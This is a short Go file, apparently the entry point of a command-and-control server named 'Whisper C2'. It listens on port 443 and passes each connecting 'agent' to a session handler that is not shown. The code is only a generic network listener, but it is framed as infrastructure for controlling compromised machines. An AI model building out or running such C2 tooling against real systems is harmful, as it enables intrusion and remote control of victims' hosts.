package main

import (
	"fmt"
	"net"
	"os"
	"whisper/c2/handler"
)

func main() {
	address := "0.0.0.0:443"
	ln, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Println("[-] Failed to bind:", err)
		os.Exit(1)
	}
	fmt.Println("[*] Whisper C2 listening on", address)

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("[-] Failed to accept connection:", err)
			continue
		}
		fmt.Println("[+] Agent connected from", conn.RemoteAddr())
		go handler.HandleSession(conn)
	}
}
